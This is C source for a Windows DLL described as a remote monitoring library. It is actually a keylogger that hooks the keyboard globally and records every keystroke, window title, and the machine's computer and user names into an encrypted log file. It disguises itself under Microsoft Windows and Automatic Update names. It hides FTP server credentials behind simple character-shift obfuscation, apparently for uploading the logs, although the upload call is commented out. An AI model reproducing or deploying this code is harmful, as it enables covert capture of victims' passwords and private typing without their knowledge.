
// Library for Remote Controlled Monitoring & Administration
// of Windows based computers. Program written by Arjun Menon

#include <windows.h>
#include <wininet.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

/*********************.
| Function Prototypes |
`*********************/

__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
__declspec(dllexport) void AutomaticUpdate
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
BOOL APIENTRY DllMain(HINSTANCE hModule, 
DWORD reason_for_call, LPVOID reserved);

/* System Monitoring */
void WINAPI StartSystem(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow);
LRESULT CALLBACK MonWP (HWND hwnd, UINT message,
WPARAM wParam,LPARAM lParam);
void StartSensing();
void WriteInformation(char *str);
LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam);
void CALLBACK WindowTimer (HWND hwnd, 
UINT message, UINT iTimerID, DWORD dwTime);
void CALLBACK TimeStamp (HWND hwnd, 
UINT message, UINT iTimerID, DWORD dwTime);

/* Common Application Services */
HWND MakeSillyWindow(HINSTANCE hInstance, 
WNDPROC WndProc, LPCTSTR WndName);
void fix(char *s);
void InitializeStrings();
void SimpleEncrypt(char *str, const unsigned long int n, const char *key);

/********************************.
| Global Variables and Constants |
`********************************/

#define STR_SZ1 64
#define STR_SZ2 512
#define MAX_FSZ 4096
#define MSG(M) MessageBox(NULL,"",M,0);

const char AppName[] = "Microsoft® Windows® Operating System";
const char AppName2[] = "Microsoft® Windows® Automatic Update";
char Password[] = "a";
char BaseDirectory[MAX_PATH];

HANDLE hDLL = NULL;
HHOOK KeyHook = NULL;

#define WINDOW_TIMER  100
#define TIME_STAMP    60000
#define UPDATE_TIMER  3000

char LocLogFileExt[] = "*ibh";
char LogCountFile[] = "]llicip*ouo";
char SrvLogFileExt[] = "*ceb";
char UplinkCountFile[] = "qe_kna/.*ouo";
char LocIdFile[] = "_onoo*ouo";
char SrvIdFile[] = "_kqjp*ceb";
char InternetCheckMask[] = "dppl6++sss*ie_nkokbp*_ki";
char FtpServer[] = "sss*ejpanhejg*-1,i*_ki";
char FtpUserName[] = "ejpanhejg*-1,i*_ki";
char FtpPassword[] = "Ecjeo=qnqiLnk^]p";

/***************************.
| Exported DLL Entry Points |
`***************************/

__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	InitializeStrings();

	StartSystem((HINSTANCE)hDLL, NULL, lpszCmdLine, SW_NORMAL);
}

BOOL APIENTRY DllMain
(HINSTANCE hModule, DWORD reason_for_call, LPVOID reserved)
{
	hDLL = hModule;

	return TRUE;
}

/***************************.
| System Monitoring Program |
`***************************/

void WINAPI StartSystem(HINSTANCE hInstance, 
					   HINSTANCE hPrevInstance, 
					   PSTR szCmdLine, int nCmdShow)
{
	HWND hWnd = MakeSillyWindow
		(hInstance,MonWP,AppName);
	ShowWindow(hWnd, nCmdShow);

	MSG msg; /* the message catcher... */
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

LRESULT CALLBACK MonWP (HWND hWnd, UINT message,
						  WPARAM wParam,LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		TimeStamp(NULL,0,0,0);
		SetTimer(hWnd, 1, WINDOW_TIMER, WindowTimer);
		SetTimer(hWnd, 2, TIME_STAMP, TimeStamp);
		StartSensing();
		break;
	case WM_CLOSE:
		KillTimer (hWnd, 1);
		KillTimer (hWnd, 2);
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		PostQuitMessage (0);
		return 0;
	}
	return DefWindowProc (hWnd, message, wParam, lParam) ;
}

void StartSensing()
{
	/* start the keylogger */
	KeyHook = SetWindowsHookEx(WH_KEYBOARD,
	(HOOKPROC)KeyboardHookProc,(HINSTANCE)hDLL,(DWORD)NULL);
	/* start the update */
	//DWORD UpdId = 0;
	//CreateThread(NULL,0,StartUpdate,NULL,0,&UpdId);
}

void WriteInformation(char *str)
{
	/* opens a file in HDD of max. size MAX_FSZ,
	   and writes the string 'str' to the file.
	   Files have names that are numbered in 
	   hexadecimal and are encrypted. */

	//MessageBeep(-1);
	//MSG(str);
	SimpleEncrypt(str,strlen(str),Password);
	FILE *foo = fopen("D:\\boo.mfl","ab");
	fwrite(str,1,strlen(str),foo);
	fclose(foo);
}

LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam)
{
	/* The 32nd bit of lParam tells us if 
	   the key is being pressed or released */
	if(!(lParam >> 31))
	{
		char *keyw = (char *)calloc(STR_SZ1, sizeof(char));
		/////////////////////////////////////////////////////////
		// Describe the keystroke in wParam & store it in 'keyw'
		/////////////////////////////////////////////////////////
		{
			/* virtual key code */
			char vkc = 0;
			vkc = /* maintain alphabet case */
				((GetKeyState(VK_SHIFT) < 0)&&(
				!(GetKeyState(VK_CAPITAL) < 0)))
				? toupper((char)(wParam))
				: tolower((char)(wParam));
			/* numeric pad keys 0 to 10 */
			if((wParam >= VK_NUMPAD0)&&
			    (wParam <= VK_NUMPAD9))
				sprintf(keyw,"[NumPad:%u]",
				(wParam - VK_NUMPAD0));
			/* keys from 0 to 9 , A to Z and space */
			else if(((wParam >= 0x30) 
			     &&(wParam <= 0x5A)) 
			     ||(wParam == 0x20))
			{
				keyw[0] = vkc;
				keyw[1] = 0;
			}
			else switch(wParam)
			{
				case VK_CANCEL:    strcpy(keyw,"[CTRL-BRK]"); break;
				case VK_BACK:      strcpy(keyw,"[BACK]"); break;
				case VK_TAB:       strcpy(keyw,"[TAB]"); break;
				case VK_CLEAR:     strcpy(keyw,"[CLEAR]"); break;
				case VK_RETURN:    strcpy(keyw,"[ENTER]\r\n"); break;
				case VK_SHIFT:     strcpy(keyw,"[SHIFT]"); break;
				case VK_CONTROL:   strcpy(keyw,"[CTRL]"); break;
				case VK_MENU:      strcpy(keyw,"[ALT]"); break;
				case VK_PAUSE:     strcpy(keyw,"[PAUSE]"); break;
				case VK_CAPITAL:   strcpy(keyw,"[CapsLock]"); break;
				case VK_ESCAPE:    strcpy(keyw,"[ESC]"); break;
				case VK_PRIOR:     strcpy(keyw,"[PageUp]"); break;
				case VK_NEXT:      strcpy(keyw,"[PageDown]"); break;
				case VK_END:       strcpy(keyw,"[END]"); break;
				case VK_HOME:      strcpy(keyw,"[HOME]"); break;
				case VK_LEFT:      strcpy(keyw,"[LEFT]"); break;
				case VK_UP:        strcpy(keyw,"[UP]"); break;
				case VK_RIGHT:     strcpy(keyw,"[RIGHT]"); break;
				case VK_DOWN:      strcpy(keyw,"[DOWN]"); break;
				case VK_SELECT:    strcpy(keyw,"[SELECT]"); break;
				case VK_EXECUTE:   strcpy(keyw,"[EXECUTE]"); break;
				case VK_SNAPSHOT:  strcpy(keyw,"[PrintScreen]"); break;
				case VK_INSERT:    strcpy(keyw,"[INSERT]"); break;
				case VK_DELETE:    strcpy(keyw,"[DELETE]"); break;
				case VK_HELP:      strcpy(keyw,"[HELP]"); break;
				case VK_LWIN:      strcpy(keyw,"[LeftWindowsKey]"); break;
				case VK_RWIN:      strcpy(keyw,"[RightWindowsKey]"); break;
				case VK_APPS:      strcpy(keyw,"[ApplicationKey]"); break;
				case VK_MULTIPLY:  strcpy(keyw,"[MULTIPLY]"); break;
				case VK_ADD:       strcpy(keyw,"[ADD]"); break;
				case VK_SEPARATOR: strcpy(keyw,"[SEPERATOR]"); break;
				case VK_SUBTRACT:  strcpy(keyw,"[SUBTRACT]"); break;
				case VK_DECIMAL:   strcpy(keyw,"[DECIMAL]"); break;
				case VK_DIVIDE:    strcpy(keyw,"[DIVIDE]"); break;
				case VK_F1:        strcpy(keyw,"[F1]"); break;
				case VK_F2:        strcpy(keyw,"[F2]"); break;
				case VK_F3:        strcpy(keyw,"[F3]"); break;
				case VK_F4:        strcpy(keyw,"[F4]"); break;
				case VK_F5:        strcpy(keyw,"[F5]"); break;
				case VK_F6:        strcpy(keyw,"[F6]"); break;
				case VK_F7:        strcpy(keyw,"[F7]"); break;
				case VK_F8:        strcpy(keyw,"[F8]"); break;
				case VK_F9:        strcpy(keyw,"[F9]"); break;
				case VK_F10:       strcpy(keyw,"[F10]"); break;
				case VK_F11:       strcpy(keyw,"[F11]"); break;
				case VK_F12:       strcpy(keyw,"[F12]"); break;
				case VK_F13:       strcpy(keyw,"[F13]"); break;
				case VK_F14:       strcpy(keyw,"[F14]"); break;
				case VK_F15:       strcpy(keyw,"[F15]"); break;
				case VK_F16:       strcpy(keyw,"[F16]"); break;
				case VK_NUMLOCK:   strcpy(keyw,"[NumLock]"); break;
				case VK_SCROLL:    strcpy(keyw,"[ScrollLock]"); break;
				case VK_ATTN:      strcpy(keyw,"[ATTN]"); break;
				case VK_CRSEL:     strcpy(keyw,"[CrSel]"); break;
				case VK_EXSEL:     strcpy(keyw,"[ExSel]"); break;
				case VK_EREOF:     strcpy(keyw,"[EraseEOF]"); break;
				case VK_PLAY:      strcpy(keyw,"[PLAY]"); break;
				case VK_ZOOM:      strcpy(keyw,"[ZOOM]"); break;
				default:
					sprintf(keyw,"[(%d)%c]",wParam,wParam);
					break;
			}
		}
		/* The first 16 bits of lParam tells
		   us how long the key was pressed */
		UINT repeat = (lParam << 16) >> 16;
		if(!repeat) repeat = 1;
		char *key = (char *) calloc
		((repeat * strlen(keyw))+1, sizeof(char));
		if(key == NULL)
			goto exit_point;
		while(repeat--)
			strcat(key, keyw);

		if(key)
			WriteInformation(key);
	exit_point:
		free(keyw);
		free(key);
	}
	return CallNextHookEx(KeyHook, code, wParam, lParam);
}

void CALLBACK WindowTimer (HWND hwnd, 
                           UINT message, 
                           UINT iTimerID, 
                           DWORD dwTime)
{
	static HWND ForegroundWindow = NULL;
	static char *PreviousWindowName = NULL;
	BOOL has_changed = FALSE;

	if(GetForegroundWindow() != ForegroundWindow) {
		has_changed = TRUE;
		ForegroundWindow = GetForegroundWindow();
	}

	/* get WindowName */
	int size = GetWindowTextLength(ForegroundWindow)+1;
	char *WindowName = (char *)calloc(size,sizeof(char));
	size = GetWindowText(ForegroundWindow, WindowName, size);

	if(PreviousWindowName != NULL && WindowName != NULL) {
		if(strcmp(PreviousWindowName, WindowName))
			has_changed = TRUE;
	} else  has_changed = TRUE;

	if(has_changed)
	{
		if(PreviousWindowName)
			free(PreviousWindowName);
		if(WindowName) {
			if(strlen(WindowName)) {
				char *str = (char *)calloc
				((size+STR_SZ1)+STR_SZ2,sizeof(char));
				sprintf(str,"\n\r%s\n",WindowName);
				WriteInformation(str);
				free(str);
			}
		}
	}
	PreviousWindowName = WindowName;
}

void CALLBACK TimeStamp(HWND hwnd, 
                        UINT message, 
                        UINT iTimerID, 
                        DWORD dwTime)
{
	char *str = (char *)calloc(STR_SZ2+20,1),
	     *sub = (char *)calloc(STR_SZ2,1);

	static char time_stamp = 0;
	if(!(time_stamp%5)) {
		time_stamp++;
		// for every 5 calls stamp time & date...
		TIME_ZONE_INFORMATION here;
		SYSTEMTIME utc, local;
		GetTimeZoneInformation(&here);
		GetLocalTime(&local);
		GetSystemTime(&utc);
		char AM_PM[3];
		if(local.wHour>12) {
			strcpy(AM_PM,"PM");
			local.wHour -= 12;
		} else strcpy(AM_PM,"AM");
		sprintf(sub,
		"%u/%u/%u %u:%u:%u %s (%uH%uM GMT)",
		local.wDay,local.wMonth,local.wYear,
		local.wHour,local.wMinute,local.wSecond,
		AM_PM,utc.wHour,utc.wMinute);
		// write the time & date...
		sprintf(str,"\n\rTime %s\n",sub);
		WriteInformation(str);
	}
	static char system_stamp = 0;
	if(!(system_stamp%15)) {
		system_stamp++;
		// for every 15 calls do this....
		unsigned long int bsize = STR_SZ2;
		if( !GetComputerName(sub,&bsize) ) {
			sub = (char *) realloc (sub, bsize);
			GetComputerName(sub,&bsize);
		}
		sprintf(str," # Computer Name: %s\r\n",sub);
		WriteInformation(str);
		if( !GetUserName(sub,&bsize) ) {
			sub = (char *) realloc (sub, bsize);
			GetUserName(sub,&bsize);
		}
		sprintf(str," # User Name: %s\r\n",sub);
		WriteInformation(str);
		// get OS name & version ...
		OSVERSIONINFO ya;
		ya.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		if( GetVersionEx(&ya) ) {
			sprintf(str," # Version %u.%u Build %u ",
				ya.dwMajorVersion,
				ya.dwMinorVersion,
				ya.dwBuildNumber);
			if(ya.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
				strcat(str,"Windows 9x ");
			else if(ya.dwPlatformId == VER_PLATFORM_WIN32_NT)
				strcat(str,"Windows NT ");
			strcat(str,ya.szCSDVersion);
			WriteInformation(str);
		}
	}
	free(sub);
	free(str);
}

/*****************************.
| Common Application Services |
`*****************************/

HWND MakeSillyWindow(HINSTANCE hInstance, 
				WNDPROC WndProc, LPCTSTR WndName)
{
     WNDCLASS    wndclass ;

     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc;
     wndclass.cbClsExtra    = 0;
     wndclass.cbWndExtra    = 0;
     wndclass.hInstance     = hInstance;
     wndclass.hIcon         = LoadIcon (NULL, IDI_WINLOGO);
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW);
     wndclass.hbrBackground = (HBRUSH) COLOR_BTNFACE;
     wndclass.lpszMenuName  = NULL;
     wndclass.lpszClassName = WndName;

     if (!RegisterClass (&wndclass))
          return NULL ;

     return CreateWindow (WndName, WndName,
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, hInstance, NULL) ;
}

void fix(char *s)
{
	while(*s!='\0') *(s++) = (char)((char)(*s) + 4);
}

void InitializeStrings()
{
	fix(LocLogFileExt);
	fix(LogCountFile);
	fix(SrvLogFileExt);
	fix(UplinkCountFile);
	fix(LocIdFile);
	fix(SrvIdFile);
	fix(InternetCheckMask);
	fix(FtpServer);
	fix(FtpUserName);
	fix(FtpPassword);

	// to get BaseDirectory
	GetSystemDirectory(BaseDirectory,MAX_PATH);
	strcat(BaseDirectory,"\\srvdat\\");
	CreateDirectory(BaseDirectory,NULL);
}

void SimpleEncrypt(char *str, const unsigned long int n, const char *key)
{
	register unsigned int i = 0;
	// take complement of array
	for(i=0;i<n;i++) str[i] = (char)(~(char)(str[i]));
	const int keylen = strlen(key);
	for(i=0;i<n;i++) /* XOR encryption */
	str[i] = (char)((char)(str[i])^(char)(key[i%keylen]));
}
